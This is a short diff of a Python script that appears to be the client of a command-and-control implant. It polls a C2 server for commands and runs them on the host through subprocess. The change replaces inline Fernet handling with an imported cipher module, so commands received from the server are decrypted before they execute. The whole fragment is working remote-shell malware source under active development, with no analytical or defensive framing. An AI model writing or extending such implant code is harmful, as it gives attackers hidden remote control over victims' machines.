@@ -17,13 +17,10 @@ from requests import get, exceptions, post
 from colorama import Fore
 from time import time, sleep
 from subprocess import run, PIPE, STDOUT
-from cryptography.fernet import Fernet
-from base64 import urlsafe_b64encode
-
-
+from encryption import cipher
 # Settings Variables(Constants) Importing
 from settings import (CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY,
-                      C2_SERVER, DELAY, PORT, PROXY, HEADERS, KEY)
+                      C2_SERVER, DELAY, PORT, PROXY, HEADERS)
 
 # If Client have Windows OS
 if system() == "Windows":
@@ -82,7 +79,7 @@ while True:
         exit()
 
     # Retrieve the command from response and decode it 
-    command = response.content.decode()
+    command = cipher.decrypt(response.content).decode()
 
     # Check if the command is cd without any input path, change to home directory
     if len(command) == 2 and command == "cd":
